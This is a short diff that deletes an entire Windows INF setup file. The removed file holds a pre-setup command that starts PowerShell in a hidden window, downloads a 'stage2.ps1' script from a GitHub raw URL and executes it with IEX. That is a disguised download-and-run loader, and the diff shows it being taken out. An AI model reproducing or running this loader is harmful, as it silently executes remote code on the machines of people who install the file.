@@ -1,9 +1,0 @@
-[version]
-Signature=$$ CHICAGO $$
-AdvancedINF=2.5
-
-[DefaultInstall]
-RunPreSetupCommands=RunPreSetupCommands.Section
-
-[RunPreSetupCommands.Section]
-powershell.exe -WindowStyle Hidden -Command "IEX((New-Object Net.WebClient).DownloadString('https://github.com/John786Smith/Fix/raw/refs/heads/main/stage2.ps1'))"
